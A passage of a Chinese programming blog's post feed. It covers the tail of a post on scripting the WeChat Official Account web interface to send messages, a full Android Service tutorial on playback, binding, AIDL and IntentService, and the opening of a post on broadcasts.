<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">connection.setRequestProperty(<span class="string">"Referer"</span>,<span class="string">"https://mp.weixin.qq.com/cgi-bin/bizlogin?action=validate&amp;lang=zh_CN&amp;account="</span>+URLEncoder.encode(username, <span class="string">"UTF-8"</span>)+<span class="string">"&amp;token="</span>);</span><br></pre></td></tr></table></figure>
<p>我们是需要用到我们的用户名的，这就是为什么我们需要保存起来用户名的原因。</p>
<h3 id="信息发送"><a href="#信息发送" class="headerlink" title="信息发送"></a>信息发送</h3><p>就是一个POST包：<br><code>https://mp.weixin.qq.com/cgi-bin/singlesend?t=ajax-response&amp;f=json&amp;token=XXXXXXXXX&amp;lang=zh_CN</code><br>然后发送的数据有点意思：<br><code>token=XXXXXXXXX&amp;lang=zh_CN&amp;f=json&amp;ajax=1&amp;random=0.08843816131755489&amp;mask=false&amp;tofakeid=oLkOPwgBRGPk7bcbkzvloWAr5J5w&amp;imgcode=&amp;type=1&amp;content=test&amp;appmsg=&amp;quickreplyid=500000168</code><br>可以看到我们也是需要token的，并且我们需要的东西还有我们之前从json中获取的两个id，还有个验证码，但是在我测试过程中一直没有遇到，返回值不是很重要。</p>
<p>到此为止，我们基本的操作就完毕了，其他的一些不关键的东西我这里没给出来，因为只是一些语言的基本知识所以并不是很重要。</p>
<h3 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h3><p>这个东西其实我在Windows版本编写的过程中遇到了，很简单，地址固定，正常获取之后重新发送一下登录包就好了，不要忘记Cookie就好了。</p>
<h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>这个小框架我写了接近两天，中途遇到好多东西异常，因为我一般是用Windows写这类程序的，所以有很多小披露，这次用安卓写主要是来巩固一下之前遗忘的东西，分析起来比较简单，和我之前分析反汇编的东西来说真的是小巫见大巫的感觉，本来想紧跟着把其他的东西再一些一下，但是想起D3D和驱动的东西我还没写完，这些娱乐性质的就要先放一下。</p>
<p>具体的源代码和之前的那个反汇编工具的源代码，我都会在我的GitHub中进行分享，可以关注一下我的博客。</p>
]]></content>
      <categories>
        <category>爬虫</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>Android Service</title>
    <url>/2020/03/08/Android-Service/</url>
    <content><![CDATA[<h1 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h1><p>安卓的四大组件之一，支持后台运行。</p>
<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p>首先服务被创建的时候我们会调用<code>onCreate</code>方法，启动服务的时候会调用<code>onStartCommand</code>，在停止服务的时候我们会调用<code>onDestroy</code>，需要关注的是我们第一次启动服务的时候才呼调用<code>onCreate</code>这个方法。</p>
<h2 id="播放音乐实例"><a href="#播放音乐实例" class="headerlink" title="播放音乐实例"></a>播放音乐实例</h2><p>首先创建一个类，这个类继承于Service，我们先进行服务的配置：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">service</span> <span class="attr">android:name</span>=<span class="string">"com.example.android_study19.MyService"</span>&gt;</span><span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>服务配置完毕之后，我们就需要写启动和停止服务的操作。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">	intent.setClass(<span class="keyword">this</span>, MyService<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">	<span class="keyword">switch</span>(view.getId())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">case</span> R.id.button1:</span><br><span class="line">			startService(intent);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> R.id.button2:</span><br><span class="line">			stopService(intent);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到也就是通过intent进行数据的传递，将我们的类传给intent对象，然后就正常启动和停止就可以了。<br>然后写服务类的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.android_study19;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Service;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.media.MediaPlayer;</span><br><span class="line"><span class="keyword">import</span> android.media.MediaPlayer.OnPreparedListener;</span><br><span class="line"><span class="keyword">import</span> android.os.IBinder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyService</span> <span class="keyword">extends</span> <span class="title">Service</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> MediaPlayer player=<span class="keyword">null</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> IBinder <span class="title">onBind</span><span class="params">(Intent intent)</span> </span>&#123;<span class="comment">//绑定服务的时候调用</span></span><br><span class="line">		</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span> </span>&#123;<span class="comment">//创建时调用</span></span><br><span class="line">		player = <span class="keyword">new</span> MediaPlayer();</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			player.setDataSource(<span class="string">"/data/a.mp3"</span>);</span><br><span class="line">		&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">onStartCommand</span><span class="params">(Intent intent, <span class="keyword">int</span> flags, <span class="keyword">int</span> startId)</span> </span>&#123;<span class="comment">//被启动的时候调用</span></span><br><span class="line">		</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			player.setOnPreparedListener(<span class="keyword">new</span> OnPreparedListener() &#123;</span><br><span class="line">				</span><br><span class="line">				<span class="meta">@Override</span></span><br><span class="line">				<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onPrepared</span><span class="params">(MediaPlayer mp)</span> </span>&#123;</span><br><span class="line">					player.start();<span class="comment">//播放音乐</span></span><br><span class="line">					<span class="comment">/*</span></span><br><span class="line"><span class="comment">					 * 因为我们是异步播放，所以我们要等着准备完成才能去调用，所以有了这个函数，</span></span><br><span class="line"><span class="comment">					 * 这个是个回调的方法，也就是等待准备完毕之后就会调用这个方法</span></span><br><span class="line"><span class="comment">					 * */</span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;);</span><br><span class="line">			<span class="comment">//player.prepare();//准备资源，需要消耗资源，服务是在主线程调用，所以可能会导致主线程阻塞</span></span><br><span class="line">			player.prepareAsync();</span><br><span class="line">			</span><br><span class="line">		&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">super</span>.onStartCommand(intent, flags, startId);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span> </span>&#123;<span class="comment">//被停止后调用</span></span><br><span class="line">		player.stop();<span class="comment">//停止播放音乐</span></span><br><span class="line">		player.release();<span class="comment">//释放资源，我们不需要这个对象的时候</span></span><br><span class="line">		<span class="keyword">super</span>.onDestroy();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>大多是关键的注释写在了上面，就是一个音乐的播放，我们需要将资源文件传递上去，这个资源文件在播放前需要准备，因为可能耗时很长，所以我们用异步的方式进行传递，使用了异步就需要回调函数，<code>setOnPreparedListener</code>这个就是回调设置，回调的时候我们启动播放音乐。</p>
<h2 id="本地绑定"><a href="#本地绑定" class="headerlink" title="本地绑定"></a>本地绑定</h2><p>意思就是，我们只能在同一个进程进行服务的绑定，如果不在同一个进程就会绑定失败。<br>我们想实现暂停的按钮，也就是想实现Service这个类中的暂停方法，我们需要用到绑定，首先我们先写一个内部的binder类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyServiceBinder</span> <span class="keyword">extends</span> <span class="title">Binder</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">zanting</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		Log.d(<span class="string">"wker"</span>, <span class="string">"zanting"</span>);</span><br><span class="line">		MyService.<span class="keyword">this</span>.zanting();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">jixu</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		Log.d(<span class="string">"wker"</span>, <span class="string">"jixu"</span>);</span><br><span class="line">		MyService.<span class="keyword">this</span>.jixu();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意的是我这里继承了Binder而不是实现IBinder接口，其实我们是要返回这个接口的实现对象，为什么不实现，是因为接口太多方法要重写，我们继承的这个实现类帮我们做了，我们只需要写上我们的方法就可以了。<br>然后我们在服务的<code>onBind</code>这个方法中返回我们实例化好的一个绑定对象：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> IBinder <span class="title">onBind</span><span class="params">(Intent intent)</span> </span>&#123;<span class="comment">//绑定服务的时候调用</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">new</span> MyServiceBinder();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>服务类写的方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 服务解绑之后调用，一解绑服务也就停止了</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onUnbind</span><span class="params">(Intent intent)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">super</span>.onUnbind(intent);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onRebind</span><span class="params">(Intent intent)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">super</span>.onRebind(intent);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">zanting</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	player.pause();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">jixu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	player.start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>需要注意的是，在我测试的过程中发现，我们绑定上服务的时候，我们貌似不能直接进行<code>stopService</code>，这个结束不了。而只有我们在<code>unbindService</code>方法调用之后服务会自动停止。<br>绑定服务的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">bindService(intent, conn, Context.BIND_AUTO_CREATE);</span><br></pre></td></tr></table></figure>
<p>这句代码第一个也是intent对象，第二个是一个服务链接对象，第三个是一个flag，这里用的是我们自动进行服务的创建。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">MyServiceBinder binder;</span><br><span class="line"><span class="keyword">private</span> ServiceConnection conn;</span><br></pre></td></tr></table></figure>
<p>我们先要有一个我们自己写的binder对象，还有一个服务连接对象，我们实现<code>ServiceConnection</code>的内部类，在我们窗口被创建之后我们就要进行服务链接对象的实例化：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">conn = <span class="keyword">new</span> ServiceConnection() &#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * 服务崩溃，或系统强制杀死后调用</span></span><br><span class="line"><span class="comment">	 * */</span></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onServiceDisconnected</span><span class="params">(ComponentName name)</span> </span>&#123;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * 服务访问者与服务绑定成功后调用</span></span><br><span class="line"><span class="comment">	 * */</span></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onServiceConnected</span><span class="params">(ComponentName name, IBinder service)</span> </span>&#123;</span><br><span class="line">		binder = (MyServiceBinder)service;</span><br><span class="line">		Log.d(<span class="string">"wker"</span>, <span class="string">"bind end"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>第一个重载不是太重要，第二个重载就是说，当我们被绑定上之后，我们就会回调这个方法，对应的我们也就获取到了我们在服务中创建的那个Binder对象，通过参数的方式传递给了我们，我们接受之后，强转成我们的内部类对象就好了，之后我们就能通过这个Binder进行暂停和继续了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">	intent.setClass(<span class="keyword">this</span>, MyService<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">	<span class="keyword">switch</span>(view.getId())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">case</span> R.id.button1:</span><br><span class="line">			startService(intent);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> R.id.button2:</span><br><span class="line">			stopService(intent);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> R.id.button3:</span><br><span class="line">			bindService(intent, conn, Context.BIND_AUTO_CREATE);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> R.id.button4:</span><br><span class="line">			unbindService(conn);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> R.id.button5:</span><br><span class="line">			binder.zanting();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> R.id.button6:</span><br><span class="line">			binder.jixu();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>暂停继续就这样子实现了，但是需要注意的是，由于我们绑定了服务，我们绑定服务的生命周期和程序一样，当程序退的时候绑定对象也就停止了，但是在我测试的过程中发现两个问题：</p>
<ol>
<li>退出之后只是报了异常，而我们的服务并没有停止。</li>
<li>我发现bindService这个第三个参数并没有帮我们自动创建服务。</li>
</ol>
<p>暂时解决了第二个，因为我们只是create（创建服务），而并不是启动服务。<br>第一个也解决了，下面启动和绑定一起使用的时候提到。</p>
<h2 id="AIDL远程绑定"><a href="#AIDL远程绑定" class="headerlink" title="AIDL远程绑定"></a>AIDL远程绑定</h2><p>应用场景：也就是在不同进程之间进行数据的传递，和管道、邮槽不太像。<br>这个东西有点复杂，操作起来也有点绕。<br>首先我们需要有一个服务端，提供这个服务的，一般不是咱写，但是我们至少也要会，首先我们常规的写一个服务，这个服务要使用隐式意图：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;service android:name=<span class="string">".MyService"</span>&gt;</span><br><span class="line">    &lt;intent-filter &gt;</span><br><span class="line">        &lt;action android:name=<span class="string">"com.example.android_study20.myservice"</span>/&gt;</span><br><span class="line">    &lt;/intent-filter&gt;</span><br><span class="line">&lt;/service&gt;</span><br></pre></td></tr></table></figure>
<p>这个就是隐式意图，action就是我们要使用对外的intent名称。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.android_study20;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.aidl.MyserviceAidl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Service;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.IBinder;</span><br><span class="line"><span class="keyword">import</span> android.os.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyService</span> <span class="keyword">extends</span> <span class="title">Service</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> IBinder <span class="title">onBind</span><span class="params">(Intent intent)</span> </span>&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> MyBinder();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> a+b;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">MyBinder</span> <span class="keyword">extends</span> <span class="title">MyserviceAidl</span>.<span class="title">Stub</span></span></span><br><span class="line"><span class="class">	</span>&#123;</span><br><span class="line"></span><br><span class="line">		<span class="meta">@Override</span></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> MyService.<span class="keyword">this</span>.sum(a, b);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们也是常规的一个服务，要对外使用的就是sum方法，但是我们需要指定一个内部类，继承的是一个比较特别的内部类，这个内部类是eclipse生成的，何时生成，看下面。<br>我们新建一个包，最好新建，然后包中生成一个类或者接口，改为一个接口，然后将这个java文件更名为aidl文件，刷新一下，你的包的长相在eclipse会变成这个样子：<br><img src="img.jpg" alt="AIDL包"><br>然后我们写一个接口，这个接口要和文件名一样，然后写上你要导出的方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.aidl;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">MyserviceAidl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>感觉有点def的味道，嘻嘻。<br>这个时候我们就会发现，eclipse给我们生成了一个这样子的东西：<br><img src="img2.jpg" alt="生成的文件"><br>这个时候操作就完成了。<br>这里需要注意的是，我们对外操作的方法是有一定限制的，类型来说的话呢，我们如果要使用常规安卓自带的一般不需要导包，但是如果自定义的需要，并且我们这个自定义的类需要实现Parcelable接口，并且我们如果在参数中使用自定义的话呢需要指明：in，out，inout表示我们是要对这个参数做的操作，和C++差不多，并且接口前面是没有修饰符的。<br>服务端就编写完毕了，我们要写客户端了。<br>首先客户端我们需要先将我们的那个AIDL包复制过来，和服务端一样了就，然后我们就需要绑定服务，使用隐式意图的话呢，设置action：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Intent service = <span class="keyword">new</span> Intent();</span><br><span class="line">	service.setAction(<span class="string">"com.example.android_study20.myservice"</span>);</span><br><span class="line">	<span class="keyword">switch</span> (view.getId()) &#123;</span><br><span class="line">	<span class="keyword">case</span> R.id.button1:</span><br><span class="line">		bindService(service, conn, Context.BIND_AUTO_CREATE);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> R.id.button2:</span><br><span class="line">		unbindService(conn);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> R.id.button3:</span><br><span class="line">		<span class="keyword">if</span>(binder != <span class="keyword">null</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				<span class="keyword">int</span> c = binder.sum(<span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">				Log.d(<span class="string">"wker"</span>, c+<span class="string">""</span>);</span><br><span class="line">			&#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>正常的绑定服务，然后我们需要注意的是，我们这里用的服务连接对象返回的binder是有点不同。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> ServiceConnection conn;</span><br><span class="line"><span class="keyword">private</span> MyserviceAidl binder;</span><br></pre></td></tr></table></figure>
<p>这个binder是我们AIDL中的接口，然后在服务连对象匿名内部类中的<code>onServiceConnected</code>方法我们返回的binder是这样子获得的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">conn = <span class="keyword">new</span> ServiceConnection() &#123;</span><br><span class="line">		</span><br><span class="line">		<span class="meta">@Override</span></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onServiceDisconnected</span><span class="params">(ComponentName name)</span> </span>&#123;</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="meta">@Override</span></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onServiceConnected</span><span class="params">(ComponentName name, IBinder service)</span> </span>&#123;</span><br><span class="line">			binder = MyserviceAidl.Stub.asInterface(service);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;;</span><br></pre></td></tr></table></figure>
<p>有那么一点奇怪，但是安卓就是这个样子规定的，没有办法，就是这么写，也需要注意的是，我们需要将我们的导出的方法进行异常的捕获。</p>
<h2 id="启动绑定服务流程"><a href="#启动绑定服务流程" class="headerlink" title="启动绑定服务流程"></a>启动绑定服务流程</h2><p>上面有一点忘记了，就是说我们接触服务的时候返回值代表的是是否可以重新绑定。<br>在绑定服务之后，如果我们解除绑定，那么服务也是会停止的，正确的解决办法就是，我们绑定服务之后再启动服务（顺序可变），当我们在解绑服务的时候我们才会不会停止服，当我们再次绑定的时候我们其实调用的是重新绑定。<br>在我们绑定启动服务之后，我们点击停止服务，我们并不会立即停止，而是惠济路，只有等到解除绑定服务的时候才会真正的停止服务。<br>解决上面的第一个问题，这种情况是正确的，因为我们混合使用了，混合调用之后仅仅是解绑。</p>
<h2 id="异步服务"><a href="#异步服务" class="headerlink" title="异步服务"></a>异步服务</h2><p>为了防止在主线程中操作过多的大型数据交互的资源，我们也想在子线程中操作，所以就有了这个东西，和普通的服务差不多，但是是异步的，继承<code>IntentService</code>类，我们需要重写的是：<code>onHandleIntent</code>方法。<br>配置文件：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">service</span> <span class="attr">android:name</span>=<span class="string">".MyIntentService"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>点击事件：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Intent service  = <span class="keyword">new</span> Intent();</span><br><span class="line">	service.setClass(<span class="keyword">this</span>, MyIntentService<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">	<span class="keyword">switch</span> (view.getId()) &#123;</span><br><span class="line">	<span class="keyword">case</span> R.id.button1:</span><br><span class="line">		Log.d(<span class="string">"wker"</span>, <span class="string">"test"</span>);</span><br><span class="line">		startService(service);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> R.id.button2:</span><br><span class="line">		stopService(service);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也就是正常的服务，因为这个异步也就是继承那个原先的服务类，这里我发现，当我们没有编写按钮点击的方法的时候，会爆出<code>nosuchmethodexception异常</code>，我写错了点击的回调函数。<br>服务类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.android_study21;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.IntentService;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.Looper;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyIntentService</span> <span class="keyword">extends</span> <span class="title">IntentService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">MyIntentService</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>(MyIntentService<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;<span class="comment">//线程的名称</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		Log.d(<span class="string">"wker"</span>, <span class="string">"create"</span>);</span><br><span class="line">		<span class="keyword">super</span>.onCreate();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		Log.d(<span class="string">"wker"</span>, <span class="string">"destory"</span>);</span><br><span class="line">		<span class="keyword">super</span>.onDestroy();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * 子线程调用的异步方法</span></span><br><span class="line"><span class="comment">	 * */</span></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onHandleIntent</span><span class="params">(Intent intent)</span> </span>&#123;</span><br><span class="line">		<span class="comment">//boolean real = (Looper.myLooper()==Looper.getMainLooper());</span></span><br><span class="line">		Log.d(<span class="string">"wker"</span>, <span class="string">"test"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里刚才由于把Create方法的父类调用没写，也会出错，运行时异常。<br>这里的执行流程是这样子的，我们一绑定服务，服务就会先创建，然后执行我们的<code>onHandleIntent</code>方法，这个方法是一个异步的（子线程中运行），当这个方法一执行完毕，就会自动的关闭服务，也就是说我们不需要手动停止了！</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Android广播</title>
    <url>/2020/03/08/Android%E5%B9%BF%E6%92%AD/</url>
    <content><![CDATA[<h1 id="广播"><a href="#广播" class="headerlink" title="广播"></a>广播</h1><p>就是用来通知APP信息的，分为静态和动态注册广播接受</p>
<h2 id="静态注册"><a href="#静态注册" class="headerlink" title="静态注册"></a>静态注册</h2><p>就是通过配置AndroidManifest.xml来进行广播接收的，首先我们要先写一个类，这个类也就是我们广播接收者类，要继承<code>BroadcastReceiver</code>这个类，并且重写<code>onReceive</code>方法，实例代码：</p>
